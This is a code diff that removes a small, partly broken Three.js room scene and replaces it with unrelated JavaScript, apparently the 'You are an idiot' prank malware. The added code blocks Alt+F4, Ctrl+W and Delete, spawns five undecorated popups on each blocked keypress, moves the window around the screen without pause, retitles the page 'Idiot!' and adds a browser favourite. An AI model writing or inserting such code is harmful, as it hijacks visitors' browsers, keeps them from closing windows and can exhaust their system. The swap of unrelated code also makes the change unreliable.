@@ -1,41 +1,111 @@
-// Floor
-const floorGeometry = new THREE.PlaneGeometry(20, 20);
-const floorMaterial = new THREE.MeshBasicMaterial({color: 0x999999});
-const floor = new THREE.Mesh(floorGeometry, floorMaterial);
-floor.rotation.x = -0.5 * Math.PI;
-floor.receiveShadow = true;
-scene.add(floor);
-
-// Roof
-const roofGeometry = new THREE.PlaneGeometry(20, 20);
-const roofMaterial = new THREE.MeshBasicMaterial({color: 0xcccccc});
-roof.rotation.x = 0.5 * Math.PI;
-const roof = new THREE.Mesh(roofGeometry, roofMaterial);
-scene.add(roof);
-
-// Left wall
-const leftWallGeometry = new THREE.BoxGeometry(1, 5, 20);
-const leftWall = new THREE.Mesh(leftWallGeometry, floorMaterial);
-leftWall.position.z = -10;
-scene.add(leftWall);
-
-// Right wall
-const rightWall = leftWall.clone();
-rightWall.position.z = 10;
-scene.add(rightWall);
-
-// Make walls close in randomly
-function moveWalls() {
-leftWall.position.z += Math.random() * 0.1 - 0.05;
-rightWall.position.z += Math.random() * 0.1 - 0.05;
+function bookmark() {
+  if (navigator.userAgent.indexOf("MSIE") !== -1 || !!document.documentMode) {
+    var url = "lol.html";
+    var title = "Idiot!";
+    window.external.AddFavorite(url, title);
+  }
 }
 
-animate() {
-//...
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
 
-moveWalls();
-
-renderer.render(scene, camera);
-
-requestAnimationFrame(animate);
+function changeTitle(title) {
+  document.title = title;
 }
+
+function openWindow(url) {
+  var features = "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes";
+  aWindow = window.open(url, "_blank", features);
+}
+
+function procreate() {
+  changeTitle("Idiot!");
+  for (var i = 0; i < 5; i++) {
+    openWindow('lol.html');
+  }
+}
+
+function altf4key(event) {
+  if (event.altKey && event.keyCode == 115) {
+    event.preventDefault();
+    alert("You are an idiot!");
+    procreate();
+  }
+}
+
+function ctrlwkey(event) {
+  if (event.ctrlKey && event.keyCode == 87) {
+    event.preventDefault();
+    alert("You are an idiot!");
+    procreate();
+  }
+}
+
+function delkey(event) {
+  if (event.keyCode == 46) {
+    event.preventDefault();
+    alert("You are an idiot!");
+    procreate();
+  }
+}
+
+function newXlt() {
+  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+  window.focus();
+}
+
+function newXrt() {
+  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function newYup() {
+  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+}
+
+function newYdn() {
+  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function fOff() {
+  flagRun = 0;
+}
+
+function playBall() {
+  xPos += xOff;
+  yPos += yOff;
+
+  if (xPos > screen.width - 357) {
+    newXlt();
+  }
+
+  if (xPos < 0) {
+    newXrt();
+  }
+
+  if (yPos > screen.height - 330) {
+    newYup();
+  }
+
+  if (yPos < 0) {
+    newYdn();
+  }
+
+  if (flagRun == 1) {
+    window.moveTo(xPos, yPos);
+    setTimeout(playBall, 1);
+  }
+}
+
+// Event Listeners
+document.addEventListener("keydown", function(event) {
+  altf4key(event);
+  ctrlwkey(event);
+  delkey(event);
+});
+
+// Run the code
+bookmark();
+playBall();
